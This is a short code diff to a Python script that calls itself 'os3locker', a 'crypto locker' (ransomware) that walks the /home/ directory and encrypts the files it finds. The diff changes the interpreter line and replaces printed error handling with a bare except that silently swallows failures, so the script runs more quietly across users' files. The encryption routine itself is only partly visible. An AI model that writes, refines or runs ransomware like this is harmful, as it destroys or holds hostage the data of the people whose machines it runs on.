@@ -1,4 +1,4 @@
-#!/bin/python3
+#!/usr/bin/env python3
 print("Welcome to the os3locker, a very advanced, cross platform crypto locker for all systems")
 
 import os, struct
@@ -48,8 +48,7 @@ def encrypt_file(name, key):
             f.close()
         else:
             print(name, "To large for potato encryption")
-    except (PermissionError, FileNotFoundError) as e:
-        print(str(e))
+    except:
         pass
 
 for dirname, dirnames, filenames in os.walk('/home/'):
